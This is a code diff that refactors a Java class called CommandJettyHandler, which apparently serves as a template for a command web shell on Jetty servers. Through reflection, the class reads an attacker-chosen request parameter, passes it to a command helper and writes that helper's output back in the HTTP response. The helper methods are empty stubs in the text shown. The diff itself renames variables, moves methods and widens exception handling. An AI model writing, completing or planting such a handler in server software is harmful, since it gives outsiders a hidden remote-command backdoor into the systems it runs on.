@@ -10,14 +10,6 @@ import java.io.OutputStream;
 public class CommandJettyHandler {
     private static String paramName;
 
-    private String getParam(String param) {
-        return param;
-    }
-
-    private InputStream getInputStream(String cmd) throws Exception {
-        return null;
-    }
-
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
@@ -41,23 +33,31 @@ public class CommandJettyHandler {
             response = args[1];
         }
         try {
-            String cmd = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
-            if (cmd != null) {
-                if (baseRequest != null) {
-                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
-                }
-                InputStream inputStream = getInputStream(cmd);
+            String param = getParam((String) request.getClass().getMethod("getParameter", String.class).invoke(request, paramName));
+            if (param != null) {
+                InputStream inputStream = getInputStream(param);
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                 byte[] buf = new byte[8192];
                 int length;
                 while ((length = inputStream.read(buf)) != -1) {
                     outputStream.write(buf, 0, length);
                 }
+                if (baseRequest != null) {
+                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
+                }
                 return true;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return false;
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
     }
 }
